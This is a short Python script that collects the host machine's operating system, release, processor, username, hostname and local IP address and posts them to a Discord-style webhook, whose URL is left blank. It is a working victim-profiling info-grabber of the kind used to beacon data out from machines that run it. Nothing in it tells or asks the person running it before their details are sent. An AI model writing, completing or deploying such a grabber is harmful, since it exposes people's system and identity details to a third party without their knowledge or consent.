import platform
import socket
import psutil
import requests
import json

WEBHOOK_URL = ""

def send_webhook():
    data = {
        "username": "USERNAME",
        "embeds": [{
            "title": "Title",
            "description": f"`{system_info,user_info,network_info}`",
            "color": 0xFF0000,
            "footer": {
                "text": "Text here"
            },
            "thumbnail": {
                "url": ""
            }
        }]
    }
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(WEBHOOK_URL, data=json.dumps(data), headers=headers)


system_info = {}
system_info['OS'] = platform.system()
system_info['OS Release'] = platform.release()
system_info['Processor'] = platform.processor()

user_info = {}
user_info['Username'] = psutil.Process().username()
user_info['Hostname'] = socket.gethostname()

network_info = {}
network_info['IP Address'] = socket.gethostbyname(socket.gethostname())

if __name__ == '__main__':
    send_webhook()